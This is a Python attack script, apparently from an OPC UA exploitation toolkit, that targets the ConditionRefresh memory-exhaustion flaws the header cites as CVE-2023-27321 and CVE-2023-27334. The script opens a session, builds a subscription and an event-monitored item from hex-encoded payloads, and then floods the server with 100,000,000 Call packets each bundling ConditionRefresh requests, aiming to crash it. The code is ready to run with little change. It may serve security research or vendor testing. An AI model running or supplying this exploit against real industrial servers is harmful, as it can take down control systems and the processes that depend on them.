# Uncontrolled ConditionRefresh Attack
#   Triggering MonitoredNodes.cs!ConditionRefresh many times -
#       ConditionRefresh is started in a background thread, the issue is that remote attacker can call ConditionRefresh
#       unlimited number of times which leads to uncontrolled memory consumption and eventually to a crash
# https://reference.opcfoundation.org/v104/Core/docs/Part9/5.5.7/
#
#
# CVEs:
#   - CVE-2023-27321: https://files.opcfoundation.org/SecurityBulletins/OPC%20Foundation%20Security%20Bulletin%20CVE-2023-27321.pdf
#   - CVE-2023-27334: https://industrial.softing.com/fileadmin/psirt/downloads/syt-2023-1.html
#


from protocol import *
from ..utils import dex

def attack(server_details, num_requests=1):
    program_type, ip_addr, port, query_string = server_details

    opcua = OPCUA(program_type=program_type, ip_addr=ip_addr, port=port, query_string=query_string)
    opcua.create_session()

    # 1 - Create Subscription
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=787) # Create Subscription Request
    create_subscription_body = bytes.fromhex("0000000000408f40e80300000a0000000000000001ff")
    message = message_header + message_body + create_subscription_body
    print("[-] Sending MSG Request - CreateSubscription")
    create_sub_response = opcua.send_recv(message, should_recv=True)
    subscription_id = struct.unpack("<I", create_sub_response[-20: -16])[0] # Extract subscription id

    # 2 - Create Monitored Items Request
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=751) # Create MonitoredItemsRequest
    create_monitored_items_request = struct.pack("<I", subscription_id)
    # Monitoring Namespace:0, NodeID: 2253 (Object-->Server)
    create_monitored_items_request += dex("02000000010000000100cd080c000000ffffffff0000ffffffff020000001400000000000000000000000100d7020190020000")
    create_monitored_items_request += dex("130000000100f907010000000000070000004576656e7449640d000000ffffffff0100f907010000000000090000004576656e74547970650d000000ffffffff0100f9070100000000000a000000536f757263654e616d650d000000ffffffff0100f9070100000000000400000054696d650d000000ffffffff0100f907010000000000070000004d6573736167650d000000ffffffff0100f9070100000000000800000053657665726974790d000000ffffffff0100f9070100000000000d000000436f6e646974696f6e4e616d650d000000ffffffff0100f907010000000000080000004272616e636849640d000000ffffffff0100f9070100000000000600000052657461696e0d000000ffffffff0100f9070200000000000b0000004469616c6f67537461746500000200000049640d000000ffffffff0100f9070100000000000600000050726f6d70740d000000ffffffff0100f90701000000000011000000526573706f6e73654f7074696f6e5365740d000000ffffffff0100f9070100000000000f00000044656661756c74526573706f6e73650d000000ffffffff0100f9070200000000000a00000041636b6564537461746500000200000049640d000000ffffffff0100f9070200000000000e000000436f6e6669726d6564537461746500000200000049640d000000ffffffff0100f9070100000000000b00000041637469766553746174650d000000ffffffff0100f9070200000000000b000000416374697665537461746500000200000049640d000000ffffffff0100f9070200000000000b0000004163746976655374617465000014000000456666656374697665446973706c61794e616d650d000000ffffffff0100de0a0000000001000000ffffffff") # Select Clauses
    create_monitored_items_request += dex("ffffffff") # Where Clause (-1)
    create_monitored_items_request += dex("ffffffff") # Queue Size
    create_monitored_items_request += dex("01") # Discard Oldest
    message = message_header + message_body + create_monitored_items_request
    print("[-] Sending MSG Request - Create Monitored Items Request")
    opcua.send_recv(message, count=1, should_recv=True)

    # 3 - Call request
    message_header = opcua.build_opcua_message_header()
    message_body = opcua.build_opcua_message_body(type_id=1, req_id=712) # Create Call Request


    methods_count = 10 #0x6fff
    # Call Object ID 2782 (ConditionType), Method ID: 3875 (ConditionRefresh), Input Args: SUBSCRIPTION ID (int = 7)
    single_function_call = dex("0100 de0a  0100 230f  01000000  07 ") + struct.pack("<I", subscription_id)
    methods_to_call = struct.pack("<I", methods_count) + (methods_count * single_function_call)
    message = message_header + message_body + methods_to_call

    num_times_to_send_call_packet = 100000000
    print("[-] Sending MSG Request - Create Call Request x {} times".format(num_times_to_send_call_packet))
    opcua.send_recv(message, count=num_times_to_send_call_packet, should_recv=False) # 100000000

    time.sleep(1000)
    # Close connection
    print("[-] Closing connection")
    opcua.close()